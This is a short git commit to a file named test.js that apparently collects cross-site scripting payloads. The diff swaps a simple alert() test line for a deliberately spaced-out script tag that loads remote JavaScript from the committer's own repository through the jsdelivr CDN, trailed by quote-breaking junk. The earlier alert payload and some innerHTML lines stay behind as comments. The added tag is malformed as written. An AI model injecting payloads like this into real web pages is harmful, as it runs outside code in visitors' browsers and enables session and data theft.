a61dd2a0ce2c04ce3ece247a67a8ecc16da180ae
gchjg290-create <gchjg290@gmail.com>
2026-01-11 21:04:44 +0000

    Update test.js

--- test.js
+++ test.js
@@ -1,3 +1,5 @@
-<script>alert('for test XSS');</script>
+<  script   src  =  //cdn.jsdelivr.net/gh/gchjg290-create/test@main/test.js"  >  scripts  </script>  "/static / 
+
+//<script>alert('for test XSS');</script>
 //document.body.innerHTML = 'XSS';
 //document.body.appendChild(document.createTextNode('XSS'));
